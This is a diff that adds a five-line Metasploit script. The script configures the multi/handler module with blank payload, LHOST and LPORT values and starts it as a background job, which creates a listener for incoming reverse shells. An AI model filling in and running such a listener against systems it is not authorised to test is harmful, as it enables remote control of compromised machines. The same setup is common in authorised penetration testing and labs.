@@ -1,0 +1,5 @@
+use multi/handler
+set payload 
+set LHOST 
+set LPORT 
+exploit -j
